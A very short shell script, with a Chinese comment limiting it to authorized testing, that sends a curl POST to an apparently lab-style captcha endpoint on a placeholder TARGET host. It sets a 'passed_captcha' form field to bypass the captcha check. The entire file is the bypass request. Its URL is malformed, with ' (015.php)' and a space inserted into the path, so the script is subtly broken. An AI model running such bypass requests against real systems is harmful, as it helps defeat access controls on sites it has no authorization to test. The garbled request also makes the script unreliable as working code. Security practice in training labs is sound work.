#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X POST 'http://TARGET:8080/vulnerabilities/captcha/ (015.php)' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'passed_captcha=admin'
